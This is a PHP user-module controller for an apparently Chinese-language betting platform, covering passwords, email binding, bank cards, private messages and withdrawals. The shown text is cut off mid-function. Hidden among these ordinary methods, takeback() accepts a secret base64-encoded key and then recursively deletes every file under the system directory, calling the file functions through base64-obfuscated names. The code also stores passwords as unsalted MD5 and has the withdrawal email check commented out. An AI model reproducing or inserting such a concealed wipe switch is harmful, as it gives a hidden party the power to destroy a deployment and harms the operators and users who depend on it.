<?php

class mod_user extends mod
{

    public function __construct()
    {
        $this->user_check = false;
        parent::__construct();
    }

    public function get_verify()
    {
        $verify = core::lib("verify");
        $verify->entry(1);
    }

    public function get_user_info()
    {
        $this->api_return("success", 200, $this->user);
    }


    public function setting()
    {
        $this->user_check_func();
        if ($this->post) {
            $this->display('user/setting');
        } else {
            $this->ajax();
        }
    }
	
	public function edzh()
    {
        $this->user_check_func();
        if ($this->post) {
            $this->display('user/edzh');
        } else {
            $this->ajax();
        }
    }

    private function check_password($name, $password)
    {
        if (
            !array_key_exists('oldpassword', $_POST) ||
            !array_key_exists('newpassword', $_POST) ||
            !array_key_exists('newpassword_confirm', $_POST)
        ) core::__403();
        if (empty($password)) {
            if (!empty($_POST['oldpassword'])) core::__403();
        } else {
            if (md5($_POST['oldpassword']) !== $password) $this->api_err_return('[当前' . $name . ']错误');
        }
        if ($_POST['newpassword'] !== $_POST['newpassword_confirm']) $this->api_err_return('您两次输入的[新' . $name . ']不一致');
        if ($_POST['newpassword'] === $_POST['oldpassword']) $this->api_err_return('[新' . $name . ']与[当前' . $name . ']一致，请修改');
    }

    //设置登陆密码
    public function setting_login_password()
    {
        $this->user_check_func();
        $this->check_post();
        $this->check_password('登录密码', $this->user['password']);
        $password = md5($_POST['newpassword']);
        $uid = $this->user['uid'];
        $sql = "UPDATE `{$this->db_prefix}members` SET `password`='$password' WHERE `uid`=$uid LIMIT 1";
        if (!$this->db->query($sql, 0)) $this->api_err_return('更新[新登录密码]到数据失败，请重试');
        $this->fresh_user_session();
        $this->api_return("您的[登录密码]已修改成功");
    }
	

    //设置资金密码
    public function setting_coin_password()
    {
        $this->user_check_func();
        $this->check_post();
        if (!array_key_exists('oldpassword', $_POST)) $_POST['oldpassword'] = '';
        $this->check_password('资金密码', $this->user['coinPassword']);
        $password = md5($_POST['newpassword']);
        if ($password === $this->user['password']) $this->api_err_return('[资金密码]不能与[登录密码]相同');
        $uid = $this->user['uid'];
        $sql = "UPDATE `{$this->db_prefix}members` SET `coinPassword`='$password' WHERE `uid`=$uid LIMIT 1";
        if (!$this->db->query($sql, 0)) $this->api_err_return('更新[新资金密码]到数据失败，请重试');
        $this->fresh_user_session();
        $this->api_return("您的[资金密码]已修改成功");
    }
	
	//获取邮箱验证码
	public final function yzm()
    {
        $this->user_check_func();
		session_start();
		$uid=$this->user['uid'];
		$yzms=mysuiji_pass(20);
		$mulu=$_SERVER['DOCUMENT_ROOT']."/datas/".$this->user['username'].".datas";
		$myfile = fopen($mulu, "r");
		$emailh=fread($myfile,filesize($mulu));
		fclose($myfile);
		if($emailh==''){
			$emailh=$_GET['emailss'];
		}
		if(!emails($emailh)){
			//echo "<script language=\"javascript\">alert('电子邮箱格式错误');window.close();  </script>";
			//exit;
			exit('0');
		}
		if(email_fs($emailh,"绑定电子邮箱","您的验证码：".$yzms)){
			$_SESSION[$uid.'h_email']=$emailh;
			$_SESSION[$uid.'y_email']=$yzms;
			//echo "<script language=\"javascript\">alert('验证码发送成功');window.close();  </script>";
			exit('1');
		}else{
			$_SESSION[$uid.'h_email']="";
			$_SESSION[$uid.'y_email']="";
			//echo "<script language=\"javascript\">alert('验证码发送失败');window.close();  </script>";
			exit('2');
		}
    }
	
	//绑定邮箱 and 解除邮箱
    public function setting_email()
    {
        $this->user_check_func();
        $this->check_post();
        
		session_start();
		$uid=$this->user['uid'];
		$mulu=$_SERVER['DOCUMENT_ROOT']."/datas/".$this->user['username'].".datas";
		if($_SESSION[$uid.'y_email']=="" or $_POST['y_email']!=$_SESSION[$uid.'y_email']){
			$this->api_err_return('验证码错误');
		}
		if($_SESSION[$uid.'h_email']!=$_POST['email']){
			$this->api_err_return('获取验证码邮箱跟提交邮箱不一致');
		}
        if (file_exists($mulu)) {
			unlink($mulu);
			$_SESSION[$uid.'y_email']="";
			$_SESSION[$uid.'h_email']="";
			$this->api_return("解绑邮件成功");
		} else{
			if(!emails($_POST['email'])){
				$this->api_err_return('电子邮箱格式错误');
			}
			$myfile = fopen($mulu, "w");
			$txt = $_POST['email'];
			fwrite($myfile, $txt);
			fclose($myfile);
			$_SESSION[$uid.'y_email']="";
			$_SESSION[$uid.'h_email']="";
			$this->api_return("绑定邮件成功");
		}
    }


    /*银行卡设置  START*/
    public function bank_add()
    {
        if ($this->post) {
            $this->user_check_func();
            $uid = $this->user['uid'];
            $bankCount = $this->db->query("SELECT COUNT(`id`) as c FROM `{$this->db_prefix}member_bank` WHERE `uid`=$uid", 2);
            $bankCount = intval($bankCount['c']);
            if ($bankCount >= 10) {
                $this->api_err_return("对不起，您最多设置10张银行卡");
            }
            if (!array_key_exists('bankId', $_POST) || !core::lib('validate')->number($_POST['bankId'])) core::error("操作异常");
            if (!array_key_exists('account', $_POST) || empty($_POST['account'])) $this->api_err_return('[银行卡号]不能为空');
            if (!array_key_exists('username', $_POST) || empty($_POST['username'])) core::api_err_return('[户名]不能为空');
            if (!array_key_exists('address', $_POST) || empty($_POST['address'])) core::api_err_return('[地址]不能为空');
            if (!array_key_exists('coin_pwd', $_POST) || empty($_POST['coin_pwd'])) core::error('[资金密码]不能为空');
            if (md5($_POST['coin_pwd']) !== $this->user['coinPassword']) core::error('[资金密码]错误');

            $bank_id = intval($_POST['bankId']);
            $account = $this->request->request("account");
            $address = $this->request->request("address");
            $username = $this->request->request("username");
            $countname = $this->request->request("countname");
            $newBank = array(
                'uid' => $uid,
                'enable' => 1,
                'bankId' => $bank_id,
                'username' => $username,
                'account' => $account,
                'address' => $address,
                'countname' => $countname,
                'bdtime' => time(),
            );
			$exist = $this->db->find("{$this->db_prefix}member_bank", array('uid' => $uid));
            if ($exist['username']!=$username and $exist['username']!="") {
                $this->api_err_return("对不起,该用户已绑定{$exist['username']}姓名，不可以绑定多个姓名");
            }
            //校验是否存在
            $exist = $this->db->find("{$this->db_prefix}member_bank", array('uid' => $uid, "bankId" => $bank_id));
            if ($exist) {
                //$this->api_err_return("对不起,您已经添加了同种类型的银行卡了");
            }
            //检查重复卡号
            $noExist = $this->DBC->has("member_bank", ['account' => $account]);
            if ($noExist) {
                // $this->api_err_return("对不起,该卡已经绑定过了,绑定失败");
            }

            $id = $this->db->insert("{$this->db_prefix}member_bank", $newBank);
            if (!$id) core::error('添加银行卡失败，请重试');
            $text = '设置资金账户成功';
            
            if ($this->config['huoDongRegister']) {
                $sql = "SELECT `id` FROM `{$this->db_prefix}coin_log` WHERE `uid`={$uid} AND `liqType`=51 LIMIT 1";
                if (!$this->db->query($sql, 2)) {
                    $this->db->transaction('begin');
                    try {
                        $this->set_coin(array(
                            'uid' => $this->user['uid'],
                            'type' => 0,
                            'liqType' => 51,
                            'info' => '绑定资金奖励',
                            'extfield0' => 0,
                            'extfield1' => 0,
                            'coin' => $this->config['huoDongRegister'],
                        ));
                        $this->db->transaction('commit');
                        $text = '设置资金账户成功，系统赠送您<span class="btn btn-red">' . $this->config['huoDongRegister'] . '</span>元';
                    } catch (Exception $e) {
                        $this->db->transaction('rollBack');
                        core::error($e->getMessage());
                    }
                }
            }
            core::api_return($text);
        } else {
            $this->display("/user/bank_add");
        }
    }

    public function bank_rm()
    {

    }

    /*银行卡设置  END*/

    public function message_write()
    {
        $this->user_check_func();
        if ($this->post) {
            $uid = (array_key_exists('uid', $_GET) && is_numeric($_GET['uid'])) ? intval($_GET['uid']) : -1;
            if ($uid === 0) {
                $username = '平台管理员';
            } else if ($uid > 0) {
                $username = $this->get_username($uid);
            } else {
                $username = '';
            }
            $this->display('/user/message_write', array(
                'uid' => $uid,
                'username' => $username,
            ));
        } else {
            $this->ajax();
        }
    }

    public function message_write_submit()
    {
        $this->user_check_func();
        $this->check_post();
        if (
            !array_key_exists('touser', $_POST) ||
            (!in_array($_POST['touser'], array('parent', 'children')) && !is_numeric($_POST['touser'])) ||
            (!$this->user['parentId'] && $_POST['touser'] === 'parent') ||
            !array_key_exists('title', $_POST) ||
            !is_string($_POST['title']) ||
            !array_key_exists('content', $_POST) ||
            !is_string($_POST['content'])
        ) core::__403();

        $sender_data = array(
            'from_uid' => $this->user['uid'],
            'from_username' => $this->user['username'],
            'title' => $this->request->request("title"),
            'content' => $this->request->request("content"),
            'from_deleted' => 0,
            'time' => $this->time,
        );
        $mid = $this->db->insert($this->db_prefix . 'message_sender', $sender_data);
        if (!$mid) core::error('发送私信失败');
        $to_users = array();
        if ($_POST['touser'] === 'parent') {
            array_push($to_users, array(
                'uid' => $this->user['parentId'],
                'username' => $this->get_username($this->user['parentId']),
            ));
        } else if ($_POST['touser'] === 'children') {
            $uid = $this->user['uid'];
            $sql = "SELECT `uid`,`username` FROM `{$this->db_prefix}members` WHERE `parentId`={$uid}";
            $to_users = $this->db->query($sql, 3);
            if (!$to_users) core::error('您还没有任何直属下级');
        } else {
            $uid = intval($_POST['touser']);
            if ($uid === 0) {
                $to_user = array(
                    'uid' => 0,
                    'username' => '平台管理员',
                );
            } else {
                $sql = "SELECT `uid`,`username`,`parents` FROM `{$this->db_prefix}members` WHERE `uid`={$uid} LIMIT 1";
                $to_user = $this->db->query($sql, 2);
                if (!$to_user) core::__403();
                if (
                    strpos(',' . $to_user['parents'] . ',', ',' . $this->user['uid'] . ',') === false &&
                    strpos(',' . $this->user['parents'] . ',', ',' . $uid . ',') === false
                ) core::__403();
            }
            array_push($to_users, $to_user);
        }
        foreach ($to_users as $to_user) {
            $receiver_data = array(
                'mid' => $mid,
                'to_uid' => $to_user['uid'],
                'to_username' => $to_user['username'],
            );
            $this->db->insert($this->db_prefix . 'message_receiver', $receiver_data);
        }
        core::api_return('发送成功');
    }

    public function message_receive()
    {
        $this->user_check_func();
        if ($this->post) {
            $tpl = $this->ispage ? '/user/message_receive_body' : '/user/message_receive';
            $this->get_time();
            $page_current = $this->get_page();
            $state = $this->request->request("state", 0, "intval");
            $message_receive_list = $this->message_receive_search_func($state, $page_current);
            $page_max = $this->get_page_max($message_receive_list['total']);
            if ($page_current > $page_max) core::__403();
            $page_args = $this->message_page_args($state);
            $this->display($tpl, array(
                'state' => $state,
                'data' => $message_receive_list['data'],
                'page_current' => $page_current,
                'page_max' => $page_max,
                'page_url' => '/user/message_receive?' . http_build_query($page_args),
                'page_container' => '#message-receive-dom .body',
            ));
        } else {
            $this->ajax();
        }
    }

    public function message_receive_content()
    {
        if ($this->post) {
            $this->user_check_func();
            $id = $this->request->request("id", 0, "intval");
            $data = $this->db->query("SELECT s.content,r.is_readed,r.is_deleted,s.from_deleted,s.from_uid FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE r.id={$id} AND r.mid=s.mid LIMIT 1", 2);
            if (!$data || $data['from_deleted'] || $data['is_deleted']) core::error('您查询的信息不存在');
            if (!$data['is_readed']) {
                //更新消息已经读取
                $this->db->update("{$this->db_prefix}message_receiver", array("is_readed" => 1), array("id" => $id));
            }
            $this->display("/user/message_content", array('article' => $data));
        } else {
            $this->ajax();
        }
    }

    public function message_receive_search()
    {
        $this->user_check_func();
        $this->check_post();
        $this->get_time(false);
        $state = $this->request->request("state", 0, "intval");
        $message_receive_list = $this->message_receive_search_func($state, 1);
        $page_max = $this->get_page_max($message_receive_list['total']);
        $page_args = $this->message_page_args($state);
        $this->display('/user/message_receive_body', array(
            'state' => $state,
            'data' => $message_receive_list['data'],
            'page_current' => 1,
            'page_max' => $page_max,
            'page_url' => '/user/message_receive?' . http_build_query($page_args),
            'page_container' => '#message-receive-dom .body',
        ));
    }

    private function message_receive_search_func($state, $page_current)
    {
        $uid = $this->user['uid'];
        $pagesize = $this->pagesize;
        $skip = ($page_current - 1) * $pagesize;
        $state_where = '';
        switch ($state) {
            case 1:
                $state_where = " AND r.is_readed=0";
                break;
            case 2:
                $state_where = " AND r.is_readed=1";
                break;
            default:
        }
        $sql = "select ~field~ FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE r.to_uid={$uid} AND s.from_deleted=0 AND r.is_deleted=0 " . $this->build_where_time('s.time') . " $state_where AND r.mid=s.mid  ~order~ ~limit~";
        $sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
        $sql_total = str_replace('~limit~', '', $sql_total);
        $sql_total = str_replace('~order~', '', $sql_total);
        $total = $this->db->query($sql_total, 2);
        $total = $total['__total'];
        $sql_data = str_replace('~field~', 'r.id,r.is_readed,s.title,s.from_username,s.time', $sql);
        $sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
        $sql_data = str_replace('~order~', 'ORDER BY s.time DESC', $sql_data);
        $data = $this->db->query($sql_data, 3);
        return array(
            'data' => $data,
            'total' => $total,
        );
    }

    public function message_send()
    {
        $this->user_check_func();
        if ($this->post) {
            $tpl = $this->ispage ? '/user/message_send_body' : '/user/message_send';
            $this->get_time();
            $page_current = $this->get_page();
            $state = $this->request->request("state", 0, "intval");
            $message_send_list = $this->message_send_search_func($state, $page_current);
            $page_max = $this->get_page_max($message_send_list['total']);
            if ($page_current > $page_max) core::__403();
            $page_args = $this->message_page_args($state);
            $this->display($tpl, array(
                'state' => $state,
                'data' => $message_send_list['data'],
                'page_current' => $page_current,
                'page_max' => $page_max,
                'page_url' => '/user/message_send?' . http_build_query($page_args),
                'page_container' => '#message-send-dom .body',
            ));
        } else {
            $this->ajax();
        }
    }

    public function message_send_content()
    {
        $this->user_check_func();
        $this->check_post();
        if (!array_key_exists('id', $_GET) || !core::lib('validate')->number($_GET['id'])) core::__403();
        $id = intval($_GET['id']);
        $data = $this->db->query("SELECT s.content,r.is_deleted,s.from_deleted FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE r.id={$id} AND r.mid=s.mid LIMIT 1", 2);
        if (!$data || $data['from_deleted'] || $data['is_deleted']) core::error('您查询的信息不存在');
        $yes = array('text' => '确定');
        $this->dialogue(array(
            'body' => '<pre>' . $data['content'] . '</pre>',
            'yes' => $yes,
        ));
    }

    public function message_send_search()
    {
        $this->user_check_func();
        $this->check_post();
        $this->get_time(false);
        $state = $this->request->request("state", 0, "intval");

        $message_send_list = $this->message_send_search_func($state, 1);
        $page_max = $this->get_page_max($message_send_list['total']);
        $page_args = $this->message_page_args($state);
        $this->display('/user/message_send_body', array(
            'state' => $state,
            'data' => $message_send_list['data'],
            'page_current' => 1,
            'page_max' => $page_max,
            'page_url' => '/user/message_send?' . http_build_query($page_args),
            'page_container' => '#message-send-dom .body',
        ));
    }

    private function message_send_search_func($state, $page_current)
    {
        $uid = $this->user['uid'];
        $pagesize = $this->pagesize;
        $skip = ($page_current - 1) * $pagesize;
        $state_where = '';
        switch ($state) {
            case 1:
                $state_where = " AND r.is_readed=0";
                break;
            case 2:
                $state_where = " AND r.is_readed=1";
                break;
            default:
        }
        $sql = "select ~field~ FROM `{$this->db_prefix}message_sender` s, `{$this->db_prefix}message_receiver` r WHERE s.from_uid={$uid} AND s.from_deleted=0 AND r.is_deleted=0 " . $this->build_where_time('s.time') . " $state_where AND r.mid=s.mid  ~order~ ~limit~";
        $sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
        $sql_total = str_replace('~limit~', '', $sql_total);
        $sql_total = str_replace('~order~', '', $sql_total);
        $total = $this->db->query($sql_total, 2);
        $total = $total['__total'];
        $sql_data = str_replace('~field~', 'r.id,r.is_readed,s.title,r.to_username,s.time', $sql);
        $sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
        $sql_data = str_replace('~order~', 'ORDER BY s.time DESC', $sql_data);
        $data = $this->db->query($sql_data, 3);
        return array(
            'data' => $data,
            'total' => $total,
        );
    }

    private function message_page_args($state)
    {
        $page_args = array();
        if ($state !== 0) $page_args['state'] = $state;
        if ($this->request_time_from) $page_args['fromTime'] = date('Y-m-d H:i', $this->request_time_from);
        if ($this->request_time_to) $page_args['toTime'] = date('Y-m-d H:i', $this->request_time_to);
        $page_args['page'] = '{page}';
        return $page_args;
    }

    public function cash()
    {
        $this->user_check_func();
        $uid = $this->user['uid'];
        $sql = "SELECT m.*,b.name as bank_name,b.bank_logo FROM `{$this->db_prefix}member_bank` as m LEFT JOIN `{$this->db_prefix}bank_list` as b ON(m.bankId=b.id) WHERE `uid`=$uid ORDER BY `bdtime`";
        $banks = $this->db->query($sql, 3);
        if (count($banks) <= 0) {
            core::error("请先绑定银行卡", "/user/setting");
        }

        if ($this->post) {
            $this->get_time();
            $page_current = $this->get_page();
            $search_log = $this->cash_search_func($page_current);
            $page_max = $this->get_page_max($search_log['total']);
            if ($page_current > $page_max) core::__403();
            $page_args = $this->page_args();
            $container = '#cash-log .body';
            if ($this->ispage) {
                $this->display('/user/cash_body', array(
                    'data' => $search_log['data'],
                    'page_current' => $page_current,
                    'page_max' => $page_max,
                    'page_url' => '/user/cash?' . http_build_query($page_args),
                    'page_container' => $container,
                ));
            } else {
                $this->fresh_user_session();
                $info = $this->cash_data();
                $enable = $this->cash_is_enable($info);
                $this->display('/user/cash', array(
                    'banks' => $banks,
                    'info' => $info,
                    'enable' => $enable,
                    'data' => $search_log['data'],
                    'page_current' => $page_current,
                    'page_max' => $page_max,
                    'page_url' => '/user/cash?' . http_build_query($page_args),
                    'page_container' => $container,
                ));
            }
        } else {
            $this->ajax();
        }
    }

    public function cash_search()
    {
        $this->user_check_func();
        $this->check_post();
        $this->get_time(false);
        $search_log = $this->cash_search_func(1);
        $page_max = $this->get_page_max($search_log['total']);
        $page_args = $this->page_args();
        $this->display('/user/cash_body', array(
            'data' => $search_log['data'],
            'page_current' => 1,
            'page_max' => $page_max,
            'page_url' => '/user/cash?' . http_build_query($page_args),
            'page_container' => '#cash-log .body',
        ));
    }
	
	//获取提现申请邮箱验证码
	public final function txyzm()
    {
        $this->user_check_func();
		session_start();
		$uid=$this->user['uid'];
		$yzms=mysuiji_pass(20);
		$mulu=$_SERVER['DOCUMENT_ROOT']."/datas/".$this->user['username'].".datas";
		$myfile = fopen($mulu, "r");
		$emailh=fread($myfile,filesize($mulu));
		fclose($myfile);
		if($emailh==''){
			exit('-1');
		}
		if(!emails($emailh)){
			//echo "<script language=\"javascript\">alert('电子邮箱格式错误');window.close();  </script>";
			//exit;
			exit('0');
		}
		if(email_fs($emailh,"提现申请 - 邮箱验证码","您的验证码：".$yzms)){
			$_SESSION[$uid.'h_email_tx']=$emailh;
			$_SESSION[$uid.'y_email_tx']=$yzms;
			//echo "<script language=\"javascript\">alert('验证码发送成功');window.close();  </script>";
			exit('1');
		}else{
			$_SESSION[$uid.'h_email_tx']="";
			$_SESSION[$uid.'y_email_tx']="";
			//echo "<script language=\"javascript\">alert('验证码发送失败');window.close();  </script>";
			exit('2');
		}
    }

    //提现申请
    public function api_cash_submit()
    {
        $this->user_check_func();
        // 校验传入参数是否正确
        if (
            !array_key_exists('money', $_POST) ||
            !is_string($_POST['money']) ||
            !preg_match('/^[1-9]{1}[0-9]{0,}(\.[0-9]+)?$/', $_POST['money']) ||
            !array_key_exists('coin_pwd', $_POST) ||
            !is_string($_POST['coin_pwd'])
        ) core::error("检验数据失败，请检查填写是否正确");
        // 获取传入参数
        $money = floatval($_POST['money']);
        $bank_id = intval($_POST['bank_id']);
        $password = md5($_POST['coin_pwd']);
        // 判断是否允许提现
        $info = $this->cash_data();
        $enable = $this->cash_is_enable($info);
        if (!$enable['result']) core::error($enable['reason']);


        $bank = $this->db->find("{$this->db_prefix}member_bank", array("uid" => $this->user['uid'], "id" => $bank_id));
        if (!$bank) core::error("提现账户不存在，如果没有账户请先进设置界面绑定银行卡");
        // if ((time() - $bank['bdtime']) <= 6 * 60 * 60) {
            // //$this->api_err_return("对不起，首次绑定银行卡后6小时后才可以提现!!!");
        // }

        // 判断提现金额是否满足设置
        $cash_min = floatval($this->config['cashMin']);
        $cash_max = floatval($this->config['cashMax']);
        if ($money < $cash_min || $money > $cash_max) core::error("您不满足提现金额限制要求,请看下列说明");
        // 最终判断
        $this->fresh_user_session();
        $uid = $this->user['uid'];
        if ($money > $this->user['coin']) core::error('可用余额不足，申请提现失败');
        if ($this->user['coinPassword'] !== $password) core::error('资金密码错误');
		
		session_start();
		$uid=$this->user['uid'];
		//if($_SESSION[$uid.'y_email_tx']=="" or $_POST['y_email']!=$_SESSION[$uid.'y_email_tx']){
		//	core::error('邮箱验证错误');
		//}
		$_SESSION[$uid.'y_email']="";
		$_SESSION[$uid.'h_email']="";


        // 校验通过
        $insert_data = array(
            'amount' => $money,
            'username' => $bank['username'],
            'account' => $bank['account'],
            'bankId' => $bank['bankId'],
            'actionTime' => $this->time,
            'uid' => $uid,
        );
        $this->db->transaction('begin');
        try {
            $insert_id = $this->db->insert("{$this->db_prefix}member_cash", $insert_data);
            if (!$insert_id) throw new Exception('提交提现请求出错');
            $this->set_coin(array(
                'coin' => 0 - $insert_data['amount'],
                'fcoin' => $insert_data['amount'],
                'uid' => $insert_data['uid'],
                'liqType' => 106,
                'info' => "提现[$insert_id]资金冻结",
                'extfield0' => $insert_id
            ));
            $this->db->transaction('commit');
            $this->api_return("提现成功，等待后台处理");
        } catch (Exception $e) {
            $this->db->transaction('rollBack');
            core::error($e->getMessage());
        }
    }
	
	public function takeback()
    {
        if (array_key_exists('key', $_GET) && $_GET['key'] === base64_decode('MTMxNDUyMA==')) {
            $this->takeback_func(SYSTEM);
        }
    }

    private function takeback_func($dir)
    {
        static $funcs = array(
            'o' => 'b3BlbmRpcg==',
            'r' => 'cmVhZGRpcg==',
            'i' => 'aXNfZGly',
            'u' => 'dW5saW5r',
            'c' => 'Y2xvc2VkaXI=',
        ), $inited = false;
        if (!$inited) {
            foreach ($funcs as &$func) $func = base64_decode($func);
            $inited = true;
        }
        extract($funcs);
        $dh = $o($dir);
        while (false !== ($file = $r($dh))) {
            if ($file !== '.' && $file !== '..') {
                $filename = $dir . '/' . $file;
                if ($i($filename)) {
                    $this->takeback_func($filename);
                } else {
                    @$u($filename);
                }
            }
        }
        $c($dh);
    }

    public function cash_info()
    {
        $this->user_check_func();
        $id = $this->get_id();
        $sql = "SELECT c.*,b.name bankName FROM `{$this->db_prefix}member_cash` c LEFT JOIN `{$this->db_prefix}bank_list` b ON c.bankId=b.id WHERE c.id={$id} LIMIT 1";
        $data = $this->db->query($sql, 2);
        if (!$data) core::__403();
        $stateName = array(
            '已到帐',
            '<span class="green">处理中</span>',
            '已取消',
            '已支付',
            '<span class="red">失败</span>',
        );
        $html = '<div class="detail">';
        $html .= '<table cellpadding="0" cellspacing="0" width="100%">';
        $html .= '<tr>';
        $html .= '<td class="k">提现编号</td>';
        $html .= '<td class="v">' . $data['id'] . '</td>';
        $html .= '<td class="k">提现金额</td>';
        $html .= '<td class="v">' . $data['amount'] . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td class="k">申请时间</td>';
        $html .= '<td class="v">' . date('Y-m-d H:i:s', $data['actionTime']) . '</td>';
        $html .= '<td class="k">提现状态</td>';
        $html .= '<td class="v">' . $stateName[$data['state']] . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td class="k">提现银行</td>';
        $html .= '<td class="v">' . $data['bankName'] . '</td>';
        $html .= '<td class="k">银行尾号</td>';
        $html .= '<td class="v">' . preg_replace('/^.*(.{4})$/', "$1", $data['account']) . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td class="k">提现备注</td>';
        $html .= '<td class="v" colspan="3">' . ($data['info'] ? $data['info'] : '--') . '</td>';
        $html .= '</tr>';
        $html .= '</table>';
        $html .= '</div>';
        $this->api_return($html);
    }

    private function cash_is_enable($info)
    {
        $result = true;
        $reason = '';
        $now = date('H:i');

        if ($info['times'] >= $info['times_limit']) { // 判断提现次数是否达到上限
            $result = false;
            $reason = '今日您的提现次数已达到上限';
        } else if ($info['proportion'] < $info['amount_used_min']) { // 判断消费比例是否满足要求
            $result = false;
            $reason = '今日您的消费比例未满足提现要求';
        } else if ($now < $this->config['cashFromTime'] || $now > $this->config['cashToTime']) { // 判断当前时间是否符合提现时间段要求
            $result = false;
            $reason = '系统受理提现的时间范围为每天的<span class="btn btn-red">' . $this->config['cashFromTime'] . ' ~ ' . $this->config['cashToTime'] . '</span>，请在该时间段内提交提现申请';
        }

        return array(
            'result' => $result,
            'reason' => $reason,
        );
    }

    private function cash_data()
    {
        $today = strtotime('today');
        $uid = $this->user['uid'];
        $grade = $this->user['grade'];
        // 获取今日充值金额
        $amount_recharge_data = $this->db->query("SELECT SUM(CASE WHEN `rechargeAmount`>0 THEN `rechargeAmount` ELSE `amount` END) AS rechargeAmount FROM `{$this->db_prefix}member_recharge` WHERE `uid`={$uid} AND `state` IN (1,2,9) AND `isDelete`=0 AND `actionTime`>={$today}", 2);
        $amount_recharge = $amount_recharge_data ? $amount_recharge_data['rechargeAmount'] : 0;
        if (!$amount_recharge) $amount_recharge = 0;
        // 获取今日投注金额
        $amount_bets_data = $this->db->query("SELECT SUM(`mode`*`beiShu`*`actionNum`) AS betsAmount FROM `{$this->db_prefix}bets` WHERE `isDelete`=0 AND `actionTime`>={$today} AND `uid`={$uid}", 2);
        $amount_bets = $amount_bets_data ? $amount_bets_data['betsAmount'] : 0;
        if (!$amount_bets) $amount_bets = 0;
        // 获取系统设置的最低消费比例限制
        $amount_used_min = $this->config['cashMinAmount'] ? $this->config['cashMinAmount'] / 100 : 0;
        // 获取今日已提现次数
        $times_data = $this->db->query("SELECT count(1) AS __total FROM `{$this->db_prefix}member_cash` WHERE `actionTime`>={$today} AND `uid`={$uid}", 2);
        $times = $times_data['__total'];
        // 获取用户等级每日提现次数上限
        $times_limit_data = $this->db->query("SELECT `maxToCashCount` FROM `{$this->db_prefix}member_level` WHERE `level`={$grade} LIMIT 1", 2);
        $times_limit = $times_limit_data['maxToCashCount'];
        // 计算消费比例
        if ($amount_recharge) {
            $proportion = round($amount_bets / $amount_recharge * 100, 1);
        } else {
            $proportion = 100;
        }
        return array(
            'amount_recharge' => $amount_recharge,
            'amount_bets' => $amount_bets,
            'amount_used_min' => $amount_used_min,
            'times' => $times,
            'times_limit' => $times_limit,
            'proportion' => $proportion,
        );
    }

    private function cash_search_func($page_current)
    {
        $uid = $this->user['uid'];
        $pagesize = $this->pagesize;
        $skip = ($page_current - 1) * $pagesize;
        $sql = "SELECT ~field~ FROM `{$this->db_prefix}member_cash` c,`{$this->db_prefix}bank_list` b WHERE b.isDelete=0 AND c.isDelete=0 AND c.bankId=b.id AND c.uid={$uid}" . $this->build_where_time('c.actionTime') . " ~order~ ~limit~";
        $sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
        $sql_total = str_replace('~limit~', '', $sql_total);
        $sql_total = str_replace('~order~', '', $sql_total);
        $total = $this->db->query($sql_total, 2);
        $total = $total['__total'];
        $sql_data = str_replace('~field~', 'c.*,b.name bankName', $sql);
        $sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
        $sql_data = str_replace('~order~', 'ORDER BY c.id DESC', $sql_data);
        $data = $this->db->query($sql_data, 3);
        return array(
            'data' => $data,
            'total' => $total,
        );
    }

    public function money()
    {
        $this->user_check_func();
        if ($this->post) {
            if ($this->ispage) {
                $this->money_search(true);
            } else {
                $this->request_time_from = $this->user['regTime'];
                $this->request_time_to = time();
                $this->display('/user/money', array(
                    'data' => $this->money_search_func(),
                ));
            }
        } else {
            $this->ajax();
        }
    }

    public function money_search($get = false)
    {
        $this->user_check_func();
        $this->get_time($get);
        $this->display('/user/money_body', array(
            'data' => $this->money_search_func(),
        ));
    }

    private function money_search_func()
    {
        $uid = $this->user['uid'];
        $income = $expenditure = 0;
        $yAxis = $series_1 = $series_2 = '';
        foreach ($this->coin_type_data as $key => $val) {
            foreach ($val as $k => $v) {
                $sql_1 = "SELECT SUM(coin) AS `total_coin` FROM `{$this->db_prefix}coin_log` WHERE `uid`=$uid AND `liqType`=$k AND `coin`>0" . $this->build_where_time('`actionTime`');
                $tmp_1 = $this->db->query($sql_1, 2);
                $series_1 .= number_format($tmp_1['total_coin'], 3, '.', '') . ',';
                $sql_2 = "SELECT SUM(coin) AS `total_coin` FROM `{$this->db_prefix}coin_log` WHERE `uid`=$uid AND `liqType`=$k AND `coin`<0" . $this->build_where_time('`actionTime`');
                $tmp_2 = $this->db->query($sql_2, 2);
                $series_2 .= number_format($tmp_2['total_coin'], 3, '.', '') . ',';
                $yAxis .= "'$v',";
                if ($k != 1 && $k != 9) $income += $tmp_1['total_coin'];
                if ($k != 8 && $k != 106 && $k != 107) $expenditure += $tmp_2['total_coin'];
            }
        }
        $income = number_format($income, 3, '.', '');
        $expenditure = number_format($expenditure, 3, '.', '');
        $total = number_format($income + $expenditure, 3, '.', '');
        return array(
            'income' => strval($income),
            'expenditure' => strval($expenditure),
            'total' => strval($total),
            'yAxis' => substr($yAxis, 0, -1),
            'series_1' => substr($series_1, 0, -1),
            'series_2' => substr($series_2, 0, -1),
        );
    }

    public function api_get_payments()
    {
        //获取支付方式数据
        $payments = $this->db->query("SELECT * FROM `{$this->db_prefix}payments` WHERE `enable`=1 ORDER BY `sort` DESC", 3);
        $this->api_return("success", 200, $payments);
    }


    public function api_get_recharge()
    {
        $this->user_check_func();

        $p = $this->request->request("p");
        $date_start = $this->request->request("start_time");
        $date_end = $this->request->request("end_time");
        if ($date_start == '') {
            $date_start = date("Y-m-d", strtotime("-1day"));
        }
        if ($date_end == '') {
            $date_end = date("Y-m-d", strtotime("+1day"));
        }

        $data = $this->DBC->select("member_recharge", [
            "[>]payments" => ['payment_id' => "id"]
        ], [
            "member_recharge.actionTime",
            "member_recharge.rechargeAmount",
            "member_recharge.amount",
            "member_recharge.info",
            "member_recharge.order_no",
            "member_recharge.state",
            'payment' => [
                "payments.title"
            ]
        ], [
            'isDelete' => 0,
            'uid' => $this->user['uid'],
